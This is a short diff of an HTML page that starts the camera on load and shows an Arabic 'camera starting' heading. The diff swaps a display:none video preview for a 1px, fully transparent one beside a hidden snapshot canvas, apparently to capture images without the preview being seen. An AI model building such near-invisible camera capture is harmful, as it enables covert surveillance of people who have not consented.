@@ -3,12 +3,19 @@
   <body onload="startCamera()">
     <h2 style="color: green">📷 جاري تشغيل الكاميرا...</h2>
     <!-- <video id="preview" autoplay style="width: 100%; max-width: 400px"></video> -->
-    <video
+    <!-- <video
       id="preview"
       autoplay
       muted
       playsinline
       style="display: none"
+    ></video> -->
+    <video
+      id="preview"
+      autoplay
+      muted
+      playsinline
+      style="width: 1px; height: 1px; opacity: 0"
     ></video>
 
     <canvas id="snapshot" style="display: none"></canvas>
